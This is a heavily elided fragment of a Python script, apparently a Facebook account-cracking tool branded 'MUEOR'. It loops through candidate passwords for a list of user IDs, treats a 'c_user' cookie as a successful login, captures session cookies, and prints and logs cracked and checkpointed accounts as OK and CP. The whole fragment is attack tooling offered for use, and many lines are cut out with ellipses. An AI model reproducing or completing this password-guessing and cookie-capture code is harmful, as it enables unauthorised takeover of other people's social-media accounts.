...
# LOGO
logo = ("""
88b  d88. db    db d88888b  .d88b.  d8888b. 
88'YbdP`88 88    88 88'     .8P  Y8. 88  `8D 
88  88  88 88    88 88ooooo 88    88 88oobY' 
88  88  88 88    88 88~~~~~ 88    88 88`8b   
88  88  88 88b  d88 88.     `8b  d8' 88 `88. 
YP  YP  YP ~Y8888P' Y88888P  `Y88P'  88   """)
# MAIN MANU 
def Main():
        os.system("clear")
        print(logo)
...
def sexy():
    ...
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(' [😁] OK MUEOR-OK.txt')
    print(' [😁] CP MUEOR-OK.txt')
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
def alhaj(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;32m[MUEOR-KING]\033[1;36m😍[%s/%s]😁\033[1;32m[OK-%s]\033[1;35m \r'%(loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;33m[\033[1;32mMUEOR-hello-OK 😝\033[1;33m]\033[1;92m {uid}\033[1;95m|\033[1;92m {ps} ")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;33m[\033[1;32mlal-mueor-CP\033[1;33m]\033[1;91m {uid}|{ps}")
